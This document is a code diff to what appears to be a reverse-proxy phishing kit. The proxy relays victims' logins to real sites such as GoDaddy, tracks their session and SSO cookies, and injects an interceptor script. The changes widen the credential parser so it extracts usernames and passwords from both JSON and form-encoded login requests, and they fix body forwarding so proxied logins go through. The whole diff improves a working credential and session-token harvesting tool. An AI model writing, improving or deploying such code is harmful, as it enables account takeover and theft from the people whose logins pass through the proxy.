@@ -48,7 +48,6 @@ const CRITICAL_AUTH_COOKIES = {
   godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
 
-// Track current upstream context for proper relative URL rewriting
 const UPSTREAM_CONTEXT = {
   currentDomain: null,
   currentPath: null
@@ -174,10 +173,27 @@ function hasCriticalAuthCookies(cookieString, platform) {
 }
 
 function parseCredentials(bodyText) {
-  const keyValuePairs = bodyText.split('&');
   let user = null;
   let pass = null;
+  
+  if (!bodyText) return { user, pass };
 
+  // Try parsing as JSON first
+  try {
+    const jsonData = JSON.parse(bodyText);
+    if (jsonData.username || jsonData.email || jsonData.user || jsonData.login) {
+      user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
+    }
+    if (jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass) {
+      pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass;
+    }
+    if (user && pass) return { user, pass };
+  } catch (e) {
+    // Not JSON, try form-urlencoded
+  }
+
+  // Parse as form-urlencoded (application/x-www-form-urlencoded)
+  const keyValuePairs = bodyText.split('&');
   for (const pair of keyValuePairs) {
     const [key, value] = pair.split('=');
     if (!value) continue;
@@ -195,7 +211,6 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
 function generateInterceptorScript(upstreamDomain, currentPath) {
   const pathWithoutQuery = currentPath.split('?')[0];
   const pathSegments = pathWithoutQuery.split('/').filter(Boolean);
@@ -550,8 +565,12 @@ export default async function handleRequest(request) {
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
 
+  // Remove problematic headers
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
+  // IMPORTANT: Remove content-length because we're reconstructing the body as text
+  // and the byte length might differ from the original (Unicode characters)
+  headers.delete('content-length');
 
   let bodyText = null;
   let requestBodyForUpstream = null;
@@ -606,12 +625,13 @@ export default async function handleRequest(request) {
 
     if (!['GET', 'HEAD'].includes(request.method)) {
       fetchOpts.body = requestBodyForUpstream !== null ? requestBodyForUpstream : request.body;
-      fetchOpts.duplex = 'half';
+      // REMOVED: duplex: 'half' - This was causing socket errors with buffered string bodies
     }
 
     console.log(`[DEBUG] Fetching upstream: ${upstreamUrl}`);
     console.log(`[DEBUG] Method: ${request.method}`);
     console.log(`[DEBUG] Has body: ${!!fetchOpts.body}`);
+    console.log(`[DEBUG] Content-Type: ${headers.get('content-type')}`);
 
     const resp = await fetch(upstreamUrl, fetchOpts);
 
